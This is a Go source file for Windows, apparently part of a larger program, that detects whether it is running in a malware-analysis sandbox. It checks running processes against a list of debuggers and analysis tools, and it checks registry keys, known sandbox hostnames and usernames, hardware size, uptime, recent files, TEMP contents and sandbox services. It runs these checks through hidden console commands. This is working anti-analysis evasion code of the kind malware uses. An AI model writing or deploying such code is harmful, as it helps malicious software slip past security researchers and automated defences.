//go:build windows

package main

import (
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"unsafe"
)

var (
	modKernel32            = syscall.NewLazyDLL("kernel32.dll")
	procGlobalMemoryStatus = modKernel32.NewProc("GlobalMemoryStatusEx")
	procGetDiskFreeSpace   = modKernel32.NewProc("GetDiskFreeSpaceExW")
	procGetTickCount64     = modKernel32.NewProc("GetTickCount64")
	procGetCursorPos       = syscall.NewLazyDLL("user32.dll").NewProc("GetCursorPos")
)

type memoryStatusEx struct {
	Length               uint32
	MemoryLoad           uint32
	TotalPhys            uint64
	AvailPhys            uint64
	TotalPageFile        uint64
	AvailPageFile        uint64
	TotalVirtual         uint64
	AvailVirtual         uint64
	AvailExtendedVirtual uint64
}

type point struct {
	X, Y int32
}

// Analysis tools and sandbox-specific agent processes (NOT VM tools)
var sandboxProcesses = []string{
	"wireshark.exe", "fiddler.exe", "charles.exe",
	"procmon.exe", "procmon64.exe", "procexp.exe", "procexp64.exe",
	"x32dbg.exe", "x64dbg.exe", "ollydbg.exe", "windbg.exe", "immunitydebugger.exe",
	"idaq.exe", "idaq64.exe", "idaw.exe", "idaw64.exe",
	"autoruns.exe", "pestudio.exe", "die.exe", "lordpe.exe",
	"sandboxie.exe", "sbiectrl.exe", "sbiesvc.exe",
	"cuckoomon.exe", "cuckoomon64.exe",
	"joeboxcontrol.exe", "joeboxserver.exe",
	"dumpcap.exe", "httpdebugger.exe",
	"fakenet.exe",
	"apimonitor-x86.exe", "apimonitor-x64.exe",
}

// Sandbox-specific registry keys (NOT generic VM keys)
var sandboxRegKeys = []string{
	"SOFTWARE\\Wine",
	"SOFTWARE\\FlexeraSetup\\CuckooSandbox",
}

// Known sandbox hostname patterns
var sandboxHostnamePatterns = []string{
	"SANDBOX", "CUCKOO", "TEQUILA",
	"FVFF1M7J", "WILEYPC", "INTELPRO",
	"FLAREVM", "TPMNOTIFY",
}

// Known sandbox usernames
var sandboxUsernamePatterns = []string{
	"sandbox", "cuckoo", "CurrentUser", "WDAGUtilityAccount",
	"hapubws", "YFKOL", "maltest", "malnetvm",
}

func isSandbox() bool {
	if checkSandboxProcesses() {
		return true
	}
	if checkSandboxRegistry() {
		return true
	}
	if checkHardwareLimits() {
		return true
	}
	if checkUptime() {
		return true
	}
	if checkHostnameUsername() {
		return true
	}
	if checkRecentFiles() {
		return true
	}
	if checkTempDir() {
		return true
	}
	if checkSandboxServices() {
		return true
	}
	return false
}

func checkSandboxProcesses() bool {
	cmd := exec.Command("tasklist", "/fo", "csv", "/nh")
	cmd.SysProcAttr = getSysProcAttr()
	out, err := cmd.Output()
	if err != nil {
		return false
	}
	output := strings.ToLower(string(out))
	for _, proc := range sandboxProcesses {
		if strings.Contains(output, strings.ToLower(proc)) {
			return true
		}
	}
	return false
}

func checkSandboxRegistry() bool {
	for _, key := range sandboxRegKeys {
		if regKeyExists(key) {
			return true
		}
	}
	return false
}

func regKeyExists(subKey string) bool {
	p, _ := syscall.UTF16PtrFromString(subKey)
	var hKey syscall.Handle
	ret, _, _ := procRegOpenKeyExW.Call(
		uintptr(0x80000002), // HKEY_LOCAL_MACHINE
		uintptr(unsafe.Pointer(p)),
		0,
		uintptr(0x0001), // KEY_QUERY_VALUE
		uintptr(unsafe.Pointer(&hKey)),
	)
	if ret == 0 {
		procRegCloseKey.Call(uintptr(hKey))
		return true
	}
	ret, _, _ = procRegOpenKeyExW.Call(
		uintptr(0x80000001), // HKEY_CURRENT_USER
		uintptr(unsafe.Pointer(p)),
		0,
		uintptr(0x0001),
		uintptr(unsafe.Pointer(&hKey)),
	)
	if ret == 0 {
		procRegCloseKey.Call(uintptr(hKey))
		return true
	}
	return false
}

func checkHardwareLimits() bool {
	// CPU cores < 2 (2H minimum)
	if runtime.NumCPU() < 2 {
		return true
	}

	// RAM < 2GB (2G minimum)
	var mem memoryStatusEx
	mem.Length = uint32(unsafe.Sizeof(mem))
	ret, _, _ := procGlobalMemoryStatus.Call(uintptr(unsafe.Pointer(&mem)))
	if ret != 0 && mem.TotalPhys < 2*1024*1024*1024 {
		return true
	}

	// Disk < 40GB
	var freeBytesAvailable, totalBytes, totalFreeBytes uint64
	root, _ := syscall.UTF16PtrFromString("C:\\")
	ret, _, _ = procGetDiskFreeSpace.Call(
		uintptr(unsafe.Pointer(root)),
		uintptr(unsafe.Pointer(&freeBytesAvailable)),
		uintptr(unsafe.Pointer(&totalBytes)),
		uintptr(unsafe.Pointer(&totalFreeBytes)),
	)
	if ret != 0 && totalBytes < 40*1024*1024*1024 {
		return true
	}

	return false
}

func checkUptime() bool {
	ret, _, _ := procGetTickCount64.Call()
	uptimeMs := uint64(ret)
	// Uptime < 30 minutes
	if uptimeMs < 30*60*1000 {
		return true
	}
	return false
}

func checkHostnameUsername() bool {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	hn := strings.ToUpper(hostname)
	un := strings.ToLower(username)

	for _, pattern := range sandboxHostnamePatterns {
		if strings.EqualFold(hn, pattern) {
			return true
		}
	}
	for _, pattern := range sandboxUsernamePatterns {
		if strings.EqualFold(un, pattern) {
			return true
		}
	}
	return false
}

func checkRecentFiles() bool {
	recentDir := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Recent")
	entries, err := os.ReadDir(recentDir)
	if err != nil {
		return false
	}
	if len(entries) < 3 {
		return true
	}
	return false
}

func checkTempDir() bool {
	tmpDir := os.Getenv("TEMP")
	if tmpDir == "" {
		tmpDir = os.Getenv("TMP")
	}
	if tmpDir == "" {
		return false
	}
	entries, err := os.ReadDir(tmpDir)
	if err != nil {
		return false
	}
	// Sandboxes typically have very few files in TEMP
	if len(entries) < 10 {
		return true
	}
	return false
}

func checkSandboxServices() bool {
	services := []string{
		"SbieSvc",        // Sandboxie
		"CuckooMon",      // Cuckoo
		"Joeboxserver",   // JoeBox
		"cmdvirth",       // Comodo sandbox
		"SxIn",           // Qihoo 360 sandbox
		"SAVAdminService", // Sophos sandbox
	}
	for _, svc := range services {
		cmd := exec.Command("sc", "query", svc)
		cmd.SysProcAttr = getSysProcAttr()
		out, err := cmd.CombinedOutput()
		if err == nil && strings.Contains(string(out), "RUNNING") {
			return true
		}
	}
	return false
}
